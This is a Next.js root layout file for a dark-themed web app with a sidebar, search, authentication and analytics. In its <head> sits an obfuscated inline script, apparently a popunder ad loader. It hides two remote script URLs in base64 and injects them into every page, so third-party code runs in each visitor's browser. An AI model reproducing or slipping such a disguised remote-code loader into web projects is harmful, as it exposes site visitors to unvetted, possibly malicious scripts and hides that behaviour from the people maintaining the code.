import type { Metadata } from "next";
import { Inter } from "next/font/google";
import "./globals.css";
import { ThemeProvider } from "@/components/theme-provider";
import { Sidebar } from "@/components/sidebar";
import { SearchCommand } from "@/components/search-command";
import { AuthProvider } from "@/components/auth-provider";
import { UserButton } from "@/components/user-button";
import { Analytics } from "@vercel/analytics/react";
import { metadata as siteMetadata } from "./metadata";
import Script from "next/script";

const inter = Inter({ subsets: ["latin"] });

export const metadata: Metadata = siteMetadata;

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="en" suppressHydrationWarning>
      <head>
        <Script
          type="text/javascript"
          data-cfasync="false"
          dangerouslySetInnerHTML={{
            __html: `
              /*<![CDATA[/* */
              (function(){var g=window,r="e441f630f18f23143211514fa18360c2",h=[["siteId",242+774-199-674+5180049],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],j=["d3d3LnhhZHNtYXJ0LmNvbS9XemdZUlIvbS9wZW1iZWQubWluLmpz","ZDExZW5xMnJ5bXkweWwuY2xvdWRmcm9udC5uZXQvanhpdmVseWpzLm1pbi5qcw=="],z=-1,u,o,n=function(){clearTimeout(o);z++;if(j[z]&&!(1767056268000<(new Date).getTime()&&1<z)){u=g.document.createElement("script");u.type="text/javascript";u.async=!0;var v=g.document.getElementsByTagName("script")[0];u.src="https://"+atob(j[z]);u.crossOrigin="anonymous";u.onerror=n;u.onload=function(){clearTimeout(o);g[r.slice(0,16)+r.slice(0,16)]||n()};o=setTimeout(n,5E3);v.parentNode.insertBefore(u,v)}};if(!g[r]){try{Object.freeze(g[r]=h)}catch(e){}n()}})();
              /*]]>/* */
            `,
          }}
        />
      </head>
      <body
        className={`${inter.className} bg-gradient-to-br from-gray-900 to-black text-white`}
      >
        <AuthProvider>
          <ThemeProvider
            attribute="class"
            defaultTheme="dark"
            enableSystem={false}
          >
            <div className="flex h-screen overflow-hidden">
              <Sidebar />
              <main className="flex-1 overflow-auto">
                <header className="sticky top-0 z-10 backdrop-blur-md bg-black/30 border-b border-gray-800">
                  <div className="container mx-auto px-4 py-4 flex justify-between items-center">
                    <SearchCommand />
                    <UserButton />
                  </div>
                </header>
                <div className="container mx-auto px-4 py-8">{children}</div>
              </main>
            </div>

            <Analytics />
          </ThemeProvider>
        </AuthProvider>
      </body>
    </html>
  );
}
